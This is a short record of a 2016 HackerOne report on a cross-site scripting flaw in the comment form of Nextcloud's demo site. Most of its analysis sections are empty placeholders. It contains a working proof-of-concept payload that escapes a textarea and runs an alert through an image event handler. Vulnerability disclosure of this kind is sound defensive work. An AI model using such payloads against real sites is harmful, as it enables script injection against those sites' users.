# xss on demo.nextcloud.com due to outdated version

## Metadata
- **Source:** HackerOne
- **Report:** 177713 | https://hackerone.com/reports/177713
- **Submitted:** 2016-10-23
- **Reporter:** bm666
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hello. I found the possibility of introducing "html-tag" and of xss attack in the form of adding comments. Details video.
Payload: </textarea><img src=x onmouseover=alert(document.domain)>
Browser: Firefox 49.0
OS: Ubuntu 16.04

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello. I found the possibility of introducing "html-tag" and of xss attack in the form of adding comments. Details video.
Payload: </textarea><img src=x onmouseover=alert(document.domain)>
Browser: Firefox 49.0
OS: Ubuntu 16.04

</details>

---
*Analysed by Claude on 2026-05-24*
